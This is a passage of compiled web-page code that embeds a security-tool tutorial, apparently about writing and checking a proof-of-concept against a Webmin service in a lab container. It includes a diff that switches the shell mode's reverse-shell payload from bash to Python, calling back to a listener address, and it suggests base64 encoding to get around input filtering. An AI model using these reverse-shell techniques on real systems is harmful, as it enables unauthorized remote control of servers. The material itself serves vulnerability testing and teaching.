<span class="line"><span style="color:#A6ACCD;">+ </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">[</span><span style="color:#89DDFF;">&#39;</span><span style="color:#A6ACCD;"> 0 -eq 0 </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">]</span><span style="color:#89DDFF;">&#39;</span></span>
<span class="line"><span style="color:#A6ACCD;">+ service webmin start</span></span>
<span class="line"><span style="color:#A6ACCD;">+ touch /var/webmin/miniserv.log</span></span>
<span class="line"><span style="color:#A6ACCD;">+ </span><span style="color:#82AAFF;">exec</span><span style="color:#A6ACCD;"> tail -f /var/webmin/miniserv.log</span></span>
<span class="line"><span style="color:#A6ACCD;">tail: unrecognized file system </span><span style="color:#82AAFF;">type</span><span style="color:#A6ACCD;"> 0x794c7630 </span><span style="color:#89DDFF;font-style:italic;">for</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">/var/webmin/miniserv.log</span><span style="color:#89DDFF;">&#39;</span><span style="color:#A6ACCD;">. please report this to bug-coreutils@gnu.org. reverting to polling</span></span>
<span class="line"><span style="color:#A6ACCD;">...</span></span>
<span class="line"></span></code></pre></div><h2 id="vulnerability-verification" tabindex="-1">Vulnerability verification <a class="header-anchor" href="#vulnerability-verification" aria-hidden="true">#</a></h2><p>Verify mode works fine.</p><p><img src="`+s+'" alt=""></p><p>The attack mode gets the command line parameters to execute and returns the result. The <code>--options</code> parameter can show the additional command line parameters defined by PoC.</p><p><img src="'+n+`" alt=""></p><p>Shell mode does not work with bash payload, so use Python instead. It should be noted that there are maybe some special characters in the payload, it needs to be analyzed in combination with the specific situation of the vulnerability, such as using base64 encoding to bypass the restriction.</p><div class="language-diff"><span class="copy"></span><pre><code><span class="line"><span style="color:#A6ACCD;">     def _shell(self):</span></span>
<span class="line"><span style="color:#A6ACCD;">         try:</span></span>
<span class="line"><span style="color:#89DDFF;">-</span><span style="color:#F07178;">            self._exploit(REVERSE_PAYLOAD.BASH.format(get_listener_ip(), get_listener_port()))</span></span>
<span class="line"><span style="color:#89DDFF;">+</span><span style="color:#C3E88D;">            self._exploit(REVERSE_PAYLOAD.PYTHON.format(get_listener_ip(), get_listener_port()))</span></span>
<span class="line"><span style="color:#A6ACCD;">         except Exception:</span></span>
<span class="line"><span style="color:#A6ACCD;">             pass</span></span>
<span class="line"></span></code></pre></div><p>Shell mode works fine.</p><p><img src="`+a+'" alt=""></p>',23),c=[r];function D(y,i,F,C,A,d){return o(),p("div",null,c)}var h=l(t,[["render",D]]);export{f as __pageData,h as default};
